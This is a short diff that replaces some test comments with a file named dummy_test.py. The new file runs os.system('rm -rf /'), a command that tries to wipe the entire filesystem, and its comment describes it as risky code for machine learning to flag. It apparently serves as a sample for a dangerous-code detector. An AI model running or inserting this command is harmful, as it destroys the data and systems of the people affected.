@@ -1,4 +1,4 @@
-# test comment
-# testing again
-# testing again
-print("New test line")
+
+# dummy_test.py
+import os
+os.system("rm -rf /")  # risky code for ML to flag
